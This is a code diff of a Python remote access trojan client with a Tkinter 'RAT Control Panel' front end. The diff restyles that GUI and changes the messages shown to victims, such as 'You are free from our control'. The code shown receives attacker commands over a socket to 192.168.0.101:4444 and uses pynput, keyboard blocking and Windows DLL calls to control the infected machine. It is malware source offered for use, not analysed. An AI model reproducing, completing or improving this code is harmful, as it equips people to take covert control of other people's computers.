@@ -1,3 +1,5 @@
+#chlla hai 
+
 # import random
 # import socket, subprocess, os, platform
 # from threading import Thread
@@ -20,8 +22,7 @@
 # from pynput.mouse import Controller
 # import time
 # import keyboard
-# import tkinter as tk
-# from tkinter import messagebox
+
 # user32 = ctypes.WinDLL('user32')
 # kernel32 = ctypes.WinDLL('kernel32')
 
@@ -96,6 +97,7 @@
 #                 while 1:
 #                     command = s.recv(1024).decode()
 #                     if command.lower() == 'exit' :
+#                         print("You are free from our control ;))")
 #                         break
 #                     if command == 'cd':
 #                         os.chdir(command[3:].decode('utf-8'))
@@ -601,9 +603,17 @@
 #                     self.errorsend()
 
 #             elif command == 'exit':
-#                 s.send(b"exit")
+#                 print("You are free from our control ;)")
+#                 #s.send(b"exit")
 #                 break
 
+# rat = RAT_CLIENT('192.168.0.101', 4444)
+
+# if __name__ == '__main__':
+    # rat.build_connection()
+    # rat.execute()
+
+#chlta gui
 
 # class RATInterface:
 #     def __init__(self, root):
@@ -614,7 +624,7 @@
 #         self.connect_button = tk.Button(root, text="Connect", command=self.connect_to_server)
 #         self.connect_button.pack()
 
-#         self.disconnect_button = tk.Button(root, text="Disconnect", command=self.disconnect_from_server)
+#         self.disconnect_button = tk.Button(root, text="Disconnect", command=self.disconnect_from_server,state=tk.DISABLED)
 #         self.disconnect_button.pack()
 
 #         # Create entry for IP and port
@@ -635,6 +645,7 @@
 #             self.rat_client = RAT_CLIENT(ip, port)
 #             self.rat_client.build_connection()
 #             messagebox.showinfo("Success", "Connected to server successfully!")
+#             self.root.destroy()  # Close the window after successful connection
 #             self.rat_client.execute()
 #         except Exception as e:
 #             messagebox.showerror("Error", f"Failed to connect: {str(e)}")
@@ -653,8 +664,9 @@
 
 # if __name__ == '__main__':
 #     main()
-#     # rat = RAT_CLIENT('192.168.0.194', 4444)d
-#     # rat.build_connection()
+
+
+#final code 
 import random
 import socket, subprocess, os, platform
 from threading import Thread
@@ -678,7 +690,9 @@ from pynput.mouse import Controller
 import time
 import keyboard
 import tkinter as tk
-from tkinter import ttk, messagebox
+from tkinter import messagebox
+from tkinter.font import Font
+from tkinter import ttk
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
 
@@ -745,9 +759,7 @@ class RAT_CLIENT:
                 keyboard.block_key(i)
         time.sleep(999999)
     
-    def execute(self,root):
-        self.root = root
-        self.root.destroy()
+    def execute(self):
         while True:
             command = s.recv(1024).decode()
             
@@ -1260,52 +1272,69 @@ User: {os.getlogin()}
                     self.errorsend()
 
             elif command == 'exit':
-                print("Your computer is no longer hacked ;)")
+                print("You are free from our control now ;)")
                 s.send(b"exit")
                 break
+
 
 
 class RATInterface:
     def __init__(self, root):
         self.root = root
         self.root.title("RAT Control Panel")
-        self.root.geometry("300x200")
+        
+        # Set background color for the main window
+        self.root.configure(bg="#f0f0f0")
 
-        # Create style for larger font size
-        self.style = ttk.Style()
-        self.style.configure("Large.TLabel", font=("Helvetica", 14))
+        # Create a frame for organizing widgets with a light background color
+        self.frame = tk.Frame(root, bg="#f0f0f0")
+        self.frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
 
-        # Create gradient background
-        self.gradient_bg()
+        # Create buttons with styling
+        self.connect_button = tk.Button(self.frame, text="Connect", command=self.connect_to_server, bg="#4CAF50", fg="white", padx=10, pady=5, font=("Helvetica", 10))
+        self.connect_button.grid(row=0, column=0, padx=(5, 2), pady=5, sticky="nsew")
 
-        # Create labels with larger font size
-        self.ip_label = ttk.Label(root, text="Server IP:", style="Large.TLabel")
-        self.ip_label.pack()
-        self.ip_entry = ttk.Entry(root)
-        self.ip_entry.pack()
+        self.disconnect_button = tk.Button(self.frame, text="Disconnect", command=self.disconnect_from_server, state=tk.DISABLED, bg="#FF5733", fg="white", padx=10, pady=5, font=("Helvetica", 10))
+        self.disconnect_button.grid(row=0, column=1, padx=(2, 5), pady=5, sticky="nsew")
 
-        self.port_label = ttk.Label(root, text="Port:", style="Large.TLabel")
-        self.port_label.pack()
-        self.port_entry = ttk.Entry(root)
-        self.port_entry.pack()
+        # Create labels and entries with styling
+        self.ip_label = tk.Label(self.frame, text="Server IP:", bg="#f0f0f0", font=("Helvetica", 10))
+        self.ip_label.grid(row=1, column=0, padx=(5, 2), pady=(10, 5), sticky="e")
 
-        # Create buttons
-        self.connect_button = ttk.Button(root, text="Connect", command=self.connect_to_server)
-        self.connect_button.pack(pady=10)
+        self.ip_entry = tk.Entry(self.frame, bg="white", relief="solid", bd=1, font=("Helvetica", 10))
+        self.ip_entry.grid(row=1, column=1, padx=(2, 5), pady=(10, 5), sticky="ew")
 
-        self.disconnect_button = ttk.Button(root, text="Disconnect", command=self.disconnect_from_server, state="disabled")
-        self.disconnect_button.pack(pady=5)
+        self.port_label = tk.Label(self.frame, text="Port:", bg="#f0f0f0", font=("Helvetica", 10))
+        self.port_label.grid(row=2, column=0, padx=(3, 2), pady=5, sticky="e")
+
+        self.port_entry = tk.Entry(self.frame, bg="white", relief="solid", bd=1, font=("Helvetica", 10))
+        self.port_entry.grid(row=2, column=1, padx=(1, 5), pady=5, sticky="ew")
+
+        # Set row and column weights to make widgets expand proportionally
+        self.frame.grid_rowconfigure(1, weight=1)
+        self.frame.grid_columnconfigure((0, 1), weight=1)
+
+        # Bind the resize event to a function that adjusts the font size
+        self.root.bind('<Configure>', self.adjust_font_size)
+
+    def adjust_font_size(self, event):
+        # Calculate the new font size based on window width
+        new_font_size = max(int(self.root.winfo_width() / 50), 10)
+        
+        # Update font size for all widgets
+        for widget in [self.connect_button, self.disconnect_button, self.ip_label, self.ip_entry, self.port_label, self.port_entry]:
+            widget.config(font=("Helvetica", new_font_size))
 
     def connect_to_server(self):
         ip = self.ip_entry.get()
         port = int(self.port_entry.get())
         try:
+            # Mocking RAT_CLIENT and its methods
             self.rat_client = RAT_CLIENT(ip, port)
             self.rat_client.build_connection()
             messagebox.showinfo("Success", "Connected to server successfully!")
-            self.connect_button.config(state="disabled")
-            self.disconnect_button.config(state="normal")
-            Thread(target=self.rat_client.execute, args=(self.root,)).start()
+            self.root.destroy()  # Close the window after successful connection
+            self.rat_client.execute()
         except Exception as e:
             messagebox.showerror("Error", f"Failed to connect: {str(e)}")
 
@@ -1314,23 +1343,8 @@ class RATInterface:
             self.rat_client.s.send(b"exit")
             self.rat_client.s.close()
             messagebox.showinfo("Success", "Disconnected from server!")
-            self.connect_button.config(state="normal")
-            self.disconnect_button.config(state="disabled")
         except Exception as e:
             messagebox.showerror("Error", f"Failed to disconnect: {str(e)}")
-
-    def gradient_bg(self):
-        # Create gradient background
-        width, height = 300, 200
-        canvas = tk.Canvas(self.root, width=width, height=height)
-        canvas.pack()
-
-        for i in range(height):
-            r = int(255 * (height - i) / height)
-            g = int(192 * (height - i) / height)
-            b = int(203 * (height - i) / height)
-            color = f'#{r:02x}{g:02x}{b:02x}'
-            canvas.create_line(0, i, width, i, fill=color)
 
 def main():
     root = tk.Tk()
